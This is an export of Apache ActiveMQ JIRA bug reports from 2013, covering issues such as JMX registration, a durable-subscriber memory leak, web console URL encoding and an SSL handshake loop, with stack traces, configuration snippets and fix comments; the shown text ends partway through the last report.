NetworkConnector not registered in JMX when created from Broker View,AMQ-4823,12675522,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,24/Oct/13 17:13,07/Jun/14 21:20,14/Jul/23 05:43,24/Oct/13 17:42,5.9.0,,,,,5.10.0,5.9.1,,JMX,,,,0,,,,,,,,,"When programmatically (or through JConsole) trying to add a network connect, the connector does get properly added and started, but it does not get registered in the JMX MBean tree so there is not introspection MBean support.",,artnaseef,ceposta,jkost,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,355099,,,Sat Jun 07 21:20:25 UTC 2014,,,,,,,,,,,"0|i1p7vj:",355387,,,,,,,,,,,,,,,,,,,,,"24/Oct/13 17:42;ceposta;Fixed on trunk. We make sure to register the NC before starting it.;;;","07/Jun/14 21:20;artnaseef;Git commit: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=c2eb4863a8cc4de79a7f63fea915bf9397981bb8
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
runtime config - namespace prefix causes npe on config load,AMQ-4820,12675464,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,24/Oct/13 11:37,12/Mar/14 02:58,14/Jul/23 05:43,24/Oct/13 13:40,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"With namespace prefix - the broker node cannot be resolved in the xml config and the runtime config plugin errors out.
{code}
java.lang.IllegalArgumentException: Unexpected node type: null
	at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:311)
	at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:284)
	at org.apache.activemq.plugin.RuntimeConfigurationBroker.loadConfiguration(RuntimeConfigurationBroker.java:662)
	at org.apache.activemq.plugin.RuntimeConfigurationBroker.start(RuntimeConfigurationBroker.java:142)
	at org.apache.activemq.broker.BrokerService$5.start(BrokerService.java:2144)
	at org.apache.activemq.broker.BrokerService.doStartBroker(BrokerService.java:648)
	at org.apache.activemq.broker.BrokerService.startBroker(BrokerService.java:632)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:568)
	at org.apache.activemq.RuntimeConfigTestSupport.startBroker(RuntimeConfigTestSupport.java:52)
{code}
xml of the form:{code}
<tag0:beans xmlns:tag0=""http://www.springframework.org/schema/beans""
            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
            xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">
  <tag0:bean class=""org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"">
    <tag0:property name=""properties"">
      <tag0:bean class=""org.apache.activemq.CustomPropertiesBean""/>
    </tag0:property>
  </tag0:bean>
  <amq:broker xmlns:amq=""http://activemq.apache.org/schema/core"" start=""false"" dataDirectory=""${data}"" persistent=""false""
              brokerName=""${broker-name}"">
    <amq:destinationPolicy>
      <amq:policyMap>
        <amq:policyEntries>
          <amq:policyEntry topic="">"" producerFlowControl=""true"">
            <amq:pendingMessageLimitStrategy>
              <amq:constantPendingMessageLimitStrategy limit=""1000""/>
            </amq:pendingMessageLimitStrategy>
          </amq:policyEntry>
          <amq:policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""1mb""/>
        </amq:policyEntries>
      </amq:policyMap>
    </amq:destinationPolicy>
    <amq:managementContext>
      <amq:managementContext createConnector=""false""/>
    </amq:managementContext>
    <amq:plugins>
      <amq:jaasAuthenticationPlugin configuration=""karaf""/>
      <amq:runtimeConfigurationPlugin checkPeriod=""1000""/>
    </amq:plugins>
    <amq:systemUsage>
      <amq:systemUsage>
        <amq:memoryUsage>
          <amq:memoryUsage limit=""64 mb""/>
        </amq:memoryUsage>
        <amq:storeUsage>
          <amq:storeUsage limit=""100 gb""/>
        </amq:storeUsage>
        <amq:tempUsage>
          <amq:tempUsage limit=""50 gb""/>
        </amq:tempUsage>
      </amq:systemUsage>
    </amq:systemUsage>
    <amq:transportConnectors>
      <amq:transportConnector name=""openwire"" uri=""tcp://0.0.0.0:0?maximumConnections=1000""/>
    </amq:transportConnectors>
  </amq:broker>
</tag0:beans>{code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,355041,,,Thu Oct 24 13:40:05 UTC 2013,,,,,,,,,,,"0|i1p7in:",355329,,,,,,,,,,,,,,,,,,,,,"24/Oct/13 13:40;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/043a4ad4

darn dom.getElementsByTagName - avoid and always use getElementsByTagNameNS ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak when unsubscribing durable consumer,AMQ-4814,12674467,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jok,jok,18/Oct/13 08:17,06/Jul/15 22:21,14/Jul/23 05:43,06/Jul/15 22:21,5.8.0,,,,,5.12.0,,,Broker,,,,0,broker,durable_subscription,memory_leak,,,,,,"When creating and closing durable subscribers, references to FilePendingMessageCursor in MemoryUsage.listeners are not cleaned up.

The reason seems to be a missing call to FilePendingMessageCursor.destroy() in StoreDurableSubscriberCursor.stop().

A simple demo to reproduce the issue is attached (the leak is clearly visible after a few hundred to thousand runs). Also, i have attached a patch which resolves this issue for me - could someone check if this is correct?",,davsclaus,jok,paulgale,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Oct/13 08:22;jok;DurableSubscriberLeakDemo.java;https://issues.apache.org/jira/secure/attachment/12609109/DurableSubscriberLeakDemo.java","18/Oct/13 08:21;jok;StoreDurableSubscriberCursor.diff;https://issues.apache.org/jira/secure/attachment/12609108/StoreDurableSubscriberCursor.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,354089,,,Mon Jul 06 22:21:41 UTC 2015,,,,,,,Patch Available,,,,"0|i1p1p3:",354381,,,,,,,,,,,,,,,,,,,,,"29/Mar/14 11:32;davsclaus;Thanks for the patch. It does needs review, so lets see what [~gtully] or Tim has to say.;;;","06/Jul/15 22:21;tabish;Fixed on master;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"webconsole - Viewing message details when message ID contains a plus results in "" No message could be found for ID {messageID}""",AMQ-4813,12674399,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,artnaseef,mrbildner,mrbildner,17/Oct/13 20:45,02/Apr/14 21:50,14/Jul/23 05:43,06/Feb/14 19:02,5.8.0,,,,,5.10.0,5.9.1,,Web Console,,,,0,,,,,,,,,"Steps to reproduce:
# Using the admin console, go to the Queues page.
# Click on one of the queues to get to the queue's browse page.
# Click on a message ID that contains a plus sign (+).

Expected:
See the message's headers, properties, actions, and details.

Actual:
Get a page with the error message ""No message could be found for ID {messageID}"", where {messageID} contains the message ID clicked on.  Note that the message ID displayed in the error message replaces the plus sign (+) with a space.


Underlying cause:
The html link that is created for each message ID in the queue's browse page does not properly URL encode the message ID.  In my particular example, the link for message ID ""AgXkceW74zCq+kZB1llPos1QcmTfOziGAmWRuk1forI="" is:
    http://localhost:8161/admin/message.jsp?id=AgXkceW74zCq{color:red}+{color}kZB1llPos1QcmTfOziGAmWRuk1forI=&JMSDestination=AMQPTest

when it should be:
    http://localhost:8161/admin/message.jsp?id=AgXkceW74zCq{color:red}%2B{color}kZB1llPos1QcmTfOziGAmWRuk1forI=&JMSDestination=AMQPTest

The trouble area is shown with a red font.",,artnaseef,davsclaus,mrbildner,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,354021,,,Thu Feb 06 19:02:03 UTC 2014,,,,,,,,,,,"0|i1p19z:",354313,,,,,,,,,,,,,,,,,,,,,"30/Oct/13 08:08;davsclaus;Are you using a custom uuid on AMQ that uses + signs in the id?

The old web console is deprecated in favor of the new hawtio console from 5.9 onwards. You can try using that to browse/view your messages. ;;;","06/Feb/14 08:08;artnaseef;Can you provide example code that creates a message with one of those IDs?;;;","06/Feb/14 08:14;artnaseef;I put a plus in my hostname for now to do the trick.;;;","06/Feb/14 19:02;artnaseef;Fixed.  Added url-encoding of the message view and delete links using <c:url>.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Page http://activemq.apache.org/hermes-jms.html slightly out-of-date,AMQ-4811,12674307,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,lichtin,lichtin,17/Oct/13 12:43,07/Nov/13 16:01,14/Jul/23 05:43,07/Nov/13 16:01,,,,,,,,,,,,,0,,,,,,,,,"Page http://activemq.apache.org/hermes-jms.html
refers to old versions of ActiveMQ.
Can this be updated (perhaps make it version-agnostic).

Also there's a link to http://activemq.apache.org/hermes-screenshot.html
But that page does not actually show a screenshot.
",,lichtin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,353929,,,Thu Nov 07 16:01:54 UTC 2013,,,,,,,,,,,"0|i1p0pj:",354221,,,,,,,,,,,,,,,,,,,,,"07/Nov/13 16:01;tabish;Updated the page a bit. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Destination limit for advisory topic very high after recent commit,AMQ-4798,12673400,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,davsclaus,davsclaus,11/Oct/13 09:32,11/Oct/13 13:16,14/Jul/23 05:43,11/Oct/13 13:16,5.9.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"[10:58:42] <davsclaus>	 gtully on last amq from ASF i see this when starting the standalone broker
[10:58:43] <davsclaus>	 INFO | Usage(default:memory:topic://ActiveMQ.Advisory.MasterBroker:memory) limit=720332416 should be smaller than its parent limit=720332390
[10:58:54] <davsclaus>	 i guess its the recent 70% heap memory stuff
[10:59:11] <davsclaus>	 just wonder if everyone will see this, and if we can make the message more friendly?
[11:28:06] <rajdavies>	 davsclaus - why is the destination memory limit so high for an advisory ?
[11:29:23] <davsclaus>	 rajdavies not sure - gtully changed the default settings yesterday instead of fixed 64mb limit etc
[11:29:31] <davsclaus>	 it was 70% heap memory based instead
[11:30:03] <dejanb>	 rajdavies: and per destination limit is removed … so I guess we have some bug in there
[11:30:06] <davsclaus>	 http://git-wip-us.apache.org/repos/asf/activemq/commit/5bdcc196
[11:30:39] <rajdavies>	 davsclaus - ok - looks like a bug then",,davsclaus,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,353023,,,Fri Oct 11 13:16:46 UTC 2013,,,,,,,,,,,"0|i1ov47:",353310,,,,,,,,,,,,,,,,,,,,,"11/Oct/13 13:16;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/839b154c

we were loosing precision when doing float multiplication for usage portion, hence getting different values for child and parent usage. They are now equal so there is no unnecessary warning.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[org.apache.activemq.ActiveMQConnection] dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete..",AMQ-4791,12672893,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,08/Oct/13 20:25,08/Oct/13 20:30,14/Jul/23 05:43,08/Oct/13 20:30,5.8.0,,,,,5.9.0,,,Transport,,,,0,DMLC,failover,RAR,,,,,,"Race condition between consumer close and transport calculation of outstanding interruption processing. Transport thinks there are more responses required before allowing dispatch due to a mis count of active consumers.

NOTE: This is issue was initially reported using the Spring DMLC with the AMQ rar deployed in a J2EE container. However it can be replicated the issue with a simple JMS client creating a new consumer and closing the consumer for every call to consumer.receive(1000).

The client AMQ connection appears to stop dispatching messages to the consumer and continuously logs the following message

WARN  [org.apache.activemq.ActiveMQConnection] (ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51487) dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete..
Thread appears to remain in following state {code}

- sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise)
 - java.util.concurrent.locks.LockSupport.parkNanos(java.lang.Object, long) @bci=20, line=226 (Compiled frame)
 - java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(int, long) @bci=122, line=1033 (Interpreted frame)
 - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(int, long) @bci=25, line=1326 (Compiled frame)
 - java.util.concurrent.CountDownLatch.await(long, java.util.concurrent.TimeUnit) @bci=10, line=282 (Compiled frame)
 - org.apache.activemq.ActiveMQConnection.waitForTransportInterruptionProcessingToComplete() @bci=82, line=2455 (Compiled frame)
 - org.apache.activemq.ActiveMQConnection$3.processMessageDispatch(org.apache.activemq.command.MessageDispatch) @bci=4, line=1841 (Compiled frame)
 - org.apache.activemq.command.MessageDispatch.visit(org.apache.activemq.state.CommandVisitor) @bci=2, line=113 (Compiled frame)
 - org.apache.activemq.ActiveMQConnection.onCommand(java.lang.Object) @bci=29, line=1838 (Compiled frame)
 - org.apache.activemq.transport.ResponseCorrelator.onCommand(java.lang.Object) @bci=172, line=116 (Compiled frame)
 - org.apache.activemq.transport.MutexTransport.onCommand(java.lang.Object) @bci=52, line=50 (Compiled frame)
 - org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(java.lang.Object) @bci=148, line=203 (Compiled frame)
 - org.apache.activemq.transport.WireFormatNegotiator.onCommand(java.lang.Object) @bci=29, line=113 (Compiled frame)
 - org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(java.lang.Object) @bci=156, line=288 (Compiled frame)
 - org.apache.activemq.transport.TransportSupport.doConsume(java.lang.Object) @bci=16, line=83 (Compiled frame)
 - org.apache.activemq.transport.tcp.TcpTransport.doRun() @bci=7, line=214 (Compiled frame)
 - org.apache.activemq.transport.tcp.TcpTransport.run() @bci=47, line=196 (Compiled frame)
 - java.lang.Thread.run() @bci=11, line=722 (Interpreted frame) {code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,352516,,,Tue Oct 08 20:30:23 UTC 2013,,,,,,,,,,,"0|i1os07:",352803,,,,,,,,,,,,,,,,,,,,,"08/Oct/13 20:30;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/dc0291b2;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover maxReconnectAttempts=0 incorrectly calls org.apache.activemq.transport.TransportListener#transportInterupted ,AMQ-4785,12672314,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,04/Oct/13 10:33,04/Oct/13 10:36,14/Jul/23 05:43,04/Oct/13 10:36,5.8.0,,,,,5.9.0,,,Transport,,,,0,failover,maxReconnectAttempts,transportexceptionhandler,,,,,,"When failover is not reconnecting, maxReconnectAttempts=0, so it just being used to pick a url, on disconnect it should not invoke the interrupted/resumed transportExceptionhandler callback b/c there is no possibility of a resume. The exception just bubbles up to the application.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,351940,,,Fri Oct 04 10:36:25 UTC 2013,,,,,,,,,,,"0|i1ooh3:",352228,,,,,,,,,,,,,,,,,,,,,"04/Oct/13 10:36;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/4f19f31a;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connection.close() throws exception if already closed.,AMQ-4773,12671754,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,christians,christians,02/Oct/13 09:59,02/Oct/13 10:22,14/Jul/23 05:43,02/Oct/13 10:22,5.8.0,,,,,,,,,,,,0,,,,,,,,,"The Javadoc for {{Connection.close()}} reads: ""[...] Closing a closed connection must NOT throw an exception. [...]""

Yet, I get this:

{code}

Exception in thread ""TrueUpdate Manager JMS / Receiver"" java.lang.IllegalStateException: org.apache.activemq.ConnectionClosedException: The connection is already closed
	at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:105)
	at java.lang.Thread.run(Thread.java:680)
Caused by: org.apache.activemq.ConnectionClosedException: The connection is already closed
	at org.apache.activemq.ActiveMQConnection.checkClosed(ActiveMQConnection.java:1477)
	at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1464)
	at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:566)
	at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:630)
	at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:97)
	... 1 more
{code}
",Java SE 1.6,christians,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4769,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,351466,,,2013-10-02 09:59:49.0,,,,,,,,,,,"0|i1olk7:",351755,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connection.close() throws exception if already closed.,AMQ-4769,12671750,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,christians,christians,02/Oct/13 09:51,02/Oct/13 15:45,14/Jul/23 05:43,02/Oct/13 13:25,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"The Javadoc for Connection.close() reads

{quote}
Closing a closed connection must NOT throw an exception.
{quote}

Yet, I get this:

{code}
Exception in thread ""TrueUpdate Manager JMS / Receiver"" java.lang.IllegalStateException: org.apache.activemq.ConnectionClosedException: The connection is already closed
	at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:105)
	at java.lang.Thread.run(Thread.java:680)
Caused by: org.apache.activemq.ConnectionClosedException: The connection is already closed
	at org.apache.activemq.ActiveMQConnection.checkClosed(ActiveMQConnection.java:1477)
	at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1464)
	at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:566)
	at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:630)
	at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:97)
	... 1 more
{code}

",,christians,davsclaus,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4771,AMQ-4770,AMQ-4772,AMQ-4773,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,351462,,,Wed Oct 02 15:45:52 UTC 2013,,,,,,,,,,,"0|i1oljb:",351751,,,,,,,,,,,,,,,,,,,,,"02/Oct/13 10:54;davsclaus;See
http://docs.oracle.com/javaee/6/api/javax/jms/Connection.html#close();;;","02/Oct/13 10:56;gtully;issue is concurrent calls to close, some sync is needed.;;;","02/Oct/13 13:25;davsclaus;Thanks for reporting. If the connection is closed we no longer throw the illegal state exception.;;;","02/Oct/13 15:45;christians;Thanks for fixing it so fast!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
amqp+nio+ssl: infinite loop during inital handshake with SSL + client certs,AMQ-4753,12671230,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,minfrin,minfrin,29/Sep/13 00:08,25/Sep/14 07:46,14/Jul/23 05:43,09/Oct/13 15:13,5.8.0,,,,,5.9.0,,,JMS client,,,,0,amqp,nio,ssl,,,,,,"Start with a client application running qpid v0.24 connecting to activemq v5.8.0 server over amqps. Configure the activemq server to use client SSL certificates for authentication.

{code}
                <!-- aqmp with SSL client certs -->
         <transportConnector name=""amqps"" uri=""amqp+ssl://0.0.0.0:5672?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600&amp;transport.transformer=jms&amp;needClientAuth=true""/>
{code}

This works and messages successfully flow from server to client. Qpid however has a fatal bug where it cannot recover from broken connections, and so attempt to switch to the activemq amqp client to work around this problem.

On the client, we initialise activemq-amqp with the following parameters:

{code}
<!-- activemq -->
  <Parameter name=""java.naming.factory.initial"" value=""org.apache.activemq.jndi.ActiveMQInitialContextFactory"" />
  <Parameter name=""connectionFactoryNames"" value=""ConnectionFactory, QueueConnectionFactory, TopicConnectionFactory"" />

  <!-- Server to connect to -->
<!-- activemq -->
  <Parameter name=""java.naming.provider.url"" value=""amqp+nio+ssl://amqp.${env:SERVER_ENV}.example.com:5672"" />
{code}

With activemq-amqp in place instead of qpid, the client starts up, but no messages are processed. Instead, it is found that the aqmp+nio+ssl provider is spinning the CPU at 100% part of the way through the SSL handshake process.

A thread dump of the spinning thread is as follows:

{code}
Full thread dump Java HotSpot(TM) 64-Bit Server VM (23.25-b01 mixed mode):

""localhost-startStop-1"" daemon prio=10 tid=0x000000000179b800 nid=0x638e runnable [0x00007fd1fd84a000]
   java.lang.Thread.State: RUNNABLE
        at sun.nio.ch.FileDispatcherImpl.read0(Native Method)
        at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:39)
        at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:225)
        at sun.nio.ch.IOUtil.read(IOUtil.java:198)
        at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:375)
        - locked <0x00000000c4da50e8> (a java.lang.Object)
        at org.apache.activemq.transport.nio.NIOSSLTransport.secureRead(NIOSSLTransport.java:285)
        at org.apache.activemq.transport.nio.NIOSSLTransport.doHandshake(NIOSSLTransport.java:333)
        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:128)
        at org.apache.activemq.transport.amqp.AmqpNioSslTransport.initializeStreams(AmqpNioSslTransport.java:43)
        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:514)
        at org.apache.activemq.transport.nio.NIOTransport.doStart(NIOTransport.java:156)
        at org.apache.activemq.transport.nio.NIOSSLTransport.doStart(NIOSSLTransport.java:356)
        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238)
        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:184)
...
{code}

If an attempt is made to restart the activemq server, despite the spinning thread on the client the server side disconnection is detected by the client and the following exception is logged and the connection is successfully aborted:

{code}
Caused by: java.io.IOException: javax.net.ssl.SSLException: Received close_notify during handshake
        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:130)
        at org.apache.activemq.transport.amqp.AmqpNioSslTransport.initializeStreams(AmqpNioSslTransport.java:43)
        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:514)
        at org.apache.activemq.transport.nio.NIOTransport.doStart(NIOTransport.java:156)
        at org.apache.activemq.transport.nio.NIOSSLTransport.doStart(NIOSSLTransport.java:356)
        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
